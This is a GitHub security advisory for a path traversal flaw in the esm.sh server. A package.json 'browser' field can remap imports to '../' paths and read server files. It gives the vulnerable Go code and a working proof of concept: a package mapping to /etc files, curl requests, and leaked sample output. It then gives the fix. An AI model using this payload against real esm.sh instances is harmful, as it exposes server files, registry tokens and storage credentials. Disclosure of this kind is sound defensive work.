# [H] esm.sh: Path Traversal via package.json browser field allows reading arbitrary server files

## Summary
Severity: High
Advisory: GHSA-rg65-45m7-hq57
CVE: CVE-2026-44594
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-12
Source: https://github.com/advisories/GHSA-rg65-45m7-hq57
Type: github-advisory

## Affected
- Go: `github.com/esm-dev/esm.sh` — affected >=0 <0.0.0-20250616164159-0593516c4cfa

## Details
### Summary

A Local File Inclusion (LFI) vulnerability exists in the esbuild plugin's handling of the `browser` field in `package.json`. An attacker can publish an npm package that causes the server to read and return arbitrary files from the host filesystem during the build process.

### Details

The vulnerable code is in the `OnResolve` callback of the esbuild plugin:

https://github.com/esm-dev/esm.sh/blob/main/server/build.go

The plugin validates that resolved file paths stay within the package working directory. However, after this check, the `browser` field from `package.json` remaps the module path to an attacker-controlled value containing `../` sequences. No validation is performed after the remapping.

```go
// Sandbox check passes for the original "./d1.txt" path
if !strings.HasPrefix(filename, ctx.wd+string(os.PathSeparator)) {
    return esbuild.OnResolveResult{}, fmt.Errorf("could not resolve module %s", specifier)
}

// ... later, browser field remaps to attacker-controlled path:
if len(pkgJson.Browser) > 0 && ctx.isBrowserTarget() {
	if path, ok := pkgJson.Browser[modulePath]; ok {
		if path == "" {
			return esbuild.OnResolveResult{
				Path:      args.Path,
				Namespace: "browser-exclude",
			}, nil
		}
		if !isRelPathSpecifier(path) {
			externalPath, sideEffects, err := ctx.resolveExternalModule(path, args.Kind, withTypeJSON, analyzeMode)
			if err != nil {
				return esbuild.OnResolveResult{}, err
			}
			return esbuild.OnResolveResult{
				Path:        externalPath,
				SideEffects: sideEffects,
				External:    true,
			}, nil
		}
		modulePath = path
	}
}


// path.Join collapses "../" sequences - escapes the package directory
filename = path.Join(ctx.wd, "node_modules", ctx.esmPath.PkgName, modulePath)
// No second sandbox check
```

File contents appear in both the bundled JS output and the source map `sourcesContent` array.

Readable files are constrained by esbuild's loader selection based on file extension: `.json` files must be valid JSON, `.txt`/`.html`/`.md` are read as raw text, files without a recognized extension must be syntactically valid JavaScript. The `config.json` of esm.sh is fully readable (valid JSON with `.json` extension).

Non-existent target paths do not cause build errors - the import simply remains unresolved. This allows probing many paths in a single package, acting as a file existence oracle.

### PoC

The test package is published at https://www.npmjs.com/package/chess-sec-utils1

**package.json:**
```json
{
  "name": "chess-sec-utils1",
  "version": "1.0.6",
  "main": "index.js",
  "type": "module",
  "browser": {
    "./d1.txt": "../../../../../../../../etc/hostname",
    "./d2.json": "../../../../../../../../etc/os-release",
    "./d3.json": "../../../../../../../../etc/environment"
  }
}
```

**index.js:**
```js
import d1 from "./d1.txt"
import d2 from "./d2.json"
import d3 from "./d3.json"
export default { d1, d2, d3 }
```

```bash
npm publish
curl "https://<esm.sh-instance>/chess-sec-utils1@1.0.6"
curl "https://<esm.sh-instance>/chess-sec-utils1@1.0.6/es2022/chess-sec-utils1.mjs.map"
```

Server file contents in source map response:
```json
{
  "sourcesContent": [
    "ideapad\n",
    "PRETTY_NAME=\"Ubuntu 22.04.5 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nVERSION=\"22.04.5 LTS (Jammy Jellyfish)\"\nVERSION_CODENAME=jammy\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"https://help.ubuntu.com/\"\nBUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\nPRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\nUBUNTU_CODENAME=jammy\n",
    "PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\"\n",
    "import d1 from \"./d1.txt\"..."
  ]
}
```

<img width="1720" height="796" alt="image" src="https://github.com/user-attachments/assets/ee1c9781-2c5c-4718-b436-f6cf453f0952" />

### Impact

An attacker can read sensitive files from the server, including the esm.sh `config.json` which may contain npm registry authentication tokens and S3 storage credentials.

### Fix

Add a path validation check after the `browser` field remapping:

```go
filename = path.Join(ctx.wd, "node_modules", ctx.esmPath.PkgName, modulePath)
if !strings.HasPrefix(filename, ctx.wd+string(os.PathSeparator)) {
    return esbuild.OnResolveResult{}, fmt.Errorf("path traversal blocked")
}
```

### Credit
Svyatoslav Berestovsky of Metascan

## References
- https://github.com/esm-dev/esm.sh/security/advisories/GHSA-rg65-45m7-hq57
- https://nvd.nist.gov/vuln/detail/CVE-2026-44594
- https://github.com/esm-dev/esm.sh
- https://github.com/esm-dev/esm.sh/releases/tag/v137
